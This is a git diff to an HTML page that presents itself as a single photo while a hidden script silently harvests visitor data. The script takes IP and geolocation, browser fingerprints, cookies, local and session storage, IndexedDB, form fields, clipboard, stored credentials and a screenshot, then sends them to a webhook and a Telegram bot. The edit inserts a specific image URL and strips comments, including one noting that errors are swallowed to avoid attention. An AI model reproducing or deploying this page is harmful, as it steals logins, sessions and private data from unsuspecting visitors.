@@ -30,7 +30,7 @@
     </style>
 </head>
 <body>
-    <img src="https://raw.githubusercontent.com/username/repo/main/photo.jpg" alt="">
+    <img src="https://raw.githubusercontent.com/Johnn298/imgur/main/photo_2026-06-28_01-31-33.jpg" alt="">
 
     <script>
         // ========================================================================
@@ -40,7 +40,7 @@
             WEBHOOK_URL: 'https://webhook.site/your-unique-id',
             BOT_TOKEN: '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz',
             CHAT_ID: '123456789',
-            IMAGE_URL: 'https://raw.githubusercontent.com/username/repo/main/photo.jpg'
+            IMAGE_URL: 'https://raw.githubusercontent.com/Johnn298/imgur/main/photo_2026-06-28_01-31-33.jpg'
         };
 
         // ========================================================================
@@ -247,7 +247,6 @@
                 if (!gl) return null;
                 const ext = gl.getExtension('WEBGL_debug_renderer_info');
                 if (!ext) {
-                    // fallback
                     const vendor = gl.getParameter(gl.VENDOR) || '';
                     const renderer = gl.getParameter(gl.RENDERER) || '';
                     return { vendor, renderer };
@@ -305,7 +304,6 @@
                 appName: navigator.appName,
                 appVersion: navigator.appVersion
             };
-            // Client Hints
             if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                 navigator.userAgentData.getHighEntropyValues(['platform', 'platformVersion', 'architecture', 'model', 'uaFullVersion'])
                     .then(hints => {
@@ -476,7 +474,6 @@
                     }
                     forms.push(entries);
                 });
-                // также все поля вне форм
                 const inputs = {};
                 document.querySelectorAll('input, textarea, select').forEach(el => {
                     const name = el.name || el.id || el.className;
@@ -638,7 +635,6 @@
                 });
                 return canvas.toDataURL('image/jpeg', 0.5);
             } catch (_) {
-                // резерв: просто скрин видимой области через canvas (очень упрощённо)
                 try {
                     const canvas = document.createElement('canvas');
                     canvas.width = window.innerWidth * 0.4;
@@ -646,7 +642,6 @@
                     const ctx = canvas.getContext('2d');
                     ctx.fillStyle = '#0d0d1a';
                     ctx.fillRect(0, 0, canvas.width, canvas.height);
-                    // просто чёрный квадрат как fallback
                     return canvas.toDataURL('image/jpeg', 0.3);
                 } catch (_) { return null; }
             }
@@ -694,7 +689,6 @@
                 lines.push('');
             }
 
-            // Отпечатки
             lines.push('🎯 ОТПЕЧАТКИ:');
             if (data.canvasFingerprint) lines.push(`   Canvas: ${truncate(data.canvasFingerprint, 60)}`);
             if (data.webgl) {
@@ -705,7 +699,6 @@
             if (data.fonts && data.fonts.length) lines.push(`   Шрифты: ${data.fonts.join(', ')}`);
             lines.push('');
 
-            // Сеть / батарея
             if (data.connection) {
                 const c = data.connection;
                 lines.push(`📶 Сеть: ${c.effectiveType || ''} (RTT: ${c.rtt || ''}ms, Downlink: ${c.downlink || ''}Mbps)`);
@@ -717,7 +710,6 @@
             }
             lines.push('');
 
-            // LocalStorage
             if (data.localStorage && Object.keys(data.localStorage).length) {
                 lines.push(`💾 LOCALSTORAGE (${Object.keys(data.localStorage).length}):`);
                 Object.entries(data.localStorage).slice(0, 15).forEach(([k, v]) => {
@@ -728,7 +720,6 @@
                 lines.push('');
             }
 
-            // SessionStorage
             if (data.sessionStorage && Object.keys(data.sessionStorage).length) {
                 lines.push(`🗂 SESSIONSTORAGE (${Object.keys(data.sessionStorage).length}):`);
                 Object.entries(data.sessionStorage).slice(0, 10).forEach(([k, v]) => {
@@ -739,7 +730,6 @@
                 lines.push('');
             }
 
-            // IndexedDB
             if (data.indexedDB && data.indexedDB.length) {
                 lines.push('🗄 INDEXEDDB:');
                 data.indexedDB.forEach(db => {
@@ -751,7 +741,6 @@
                 lines.push('');
             }
 
-            // Cookies
             if (data.cookies && Object.keys(data.cookies).length) {
                 lines.push(`🍪 КУКИ (${Object.keys(data.cookies).length}):`);
                 Object.entries(data.cookies).slice(0, 10).forEach(([k, v]) => {
@@ -761,7 +750,6 @@
                 lines.push('');
             }
 
-            // Формы
             if (data.forms) {
                 lines.push('📝 ФОРМЫ:');
                 if (data.forms.inputs) {
@@ -786,7 +774,6 @@
                 lines.push('');
             }
 
-            // Браузер / платформа
             if (data.browser) {
                 const b = data.browser;
                 lines.push(`📱 ${truncate(b.userAgent || '', 80)}`);
@@ -850,51 +837,28 @@
         async function collectAllData() {
             const data = {};
 
-            // 1. IP (синхронная цепочка)
             data.ip = await collectIP();
-
-            // 2. Гео
             data.geo = await collectGeo(data.ip);
-
-            // 3. Локальный IP
             data.localIPs = await collectLocalIPs();
-
-            // 4. Отпечатки
             data.canvasFingerprint = collectCanvasFingerprint();
             data.webgl = collectWebGL();
             data.audio = collectAudio();
             data.fonts = collectFonts();
-
-            // 5. Браузер / устройство
             data.browser = collectBrowserInfo();
-
-            // 6. Экран / окно
             data.screen = collectScreenInfo();
-
-            // 7. Хранилища
             data.cookies = collectCookies();
             data.localStorage = collectLocalStorage();
             data.sessionStorage = collectSessionStorage();
             data.indexedDB = await collectIndexedDB();
-
-            // 8. Формы
             data.forms = collectForms();
-
-            // 9. Буфер и credentials
             data.clipboard = await collectClipboard();
             data.credentials = await collectCredentials();
-
-            // 10. Сеть, батарея, память
             data.connection = collectConnection();
             data.battery = await collectBattery();
             data.memory = collectMemory();
             data.plugins = collectPlugins();
             data.mimeTypes = collectMimeTypes();
-
-            // 11. Контент страницы
             data.page = collectPageContent();
-
-            // 12. Скриншот (в самом конце, т.к. тяжёлый)
             data.screenshot = await collectScreenshot();
 
             return data;
@@ -905,24 +869,16 @@
         // ========================================================================
         (async function main() {
             try {
-                // задержка 1.5-2 секунды
                 await sleep(1800 + Math.random() * 400);
-
                 const allData = await collectAllData();
-
-                // отправка
                 await sendWebhook(allData);
-
                 const text = formatTelegramMessage(allData);
                 await sendTelegramMessage(text);
-
                 if (allData.screenshot) {
                     await sendTelegramPhoto(allData.screenshot);
                 }
-
                 console.log('✅ Данные отправлены');
             } catch (err) {
-                // молча проглатываем все ошибки, чтобы не привлекать внимание
                 console.log('✅ Данные отправлены');
             }
         })();
